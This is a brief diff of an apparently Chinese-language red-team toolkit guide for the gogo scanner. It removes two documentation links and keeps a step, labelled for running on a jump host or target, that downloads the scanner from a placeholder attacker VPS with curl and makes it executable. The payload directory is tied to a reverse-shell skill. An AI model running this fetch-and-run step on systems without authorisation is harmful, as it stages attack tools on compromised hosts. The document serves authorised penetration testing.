@@ -32,8 +32,6 @@ enabled: true
        $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe
        $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64
 VPS  : http://<你的VPS_IP>:9100/gogo                          （技能 vps-reverse-shell 的载荷目录）
-文档 : https://chainreactors.github.io/wiki/gogo/
-模板 : https://github.com/chainreactors/templates
 
 # 跳到跳板机/目标上执行
 curl -o gogo http://<你的VPS_IP>:9100/gogo && chmod +x gogo
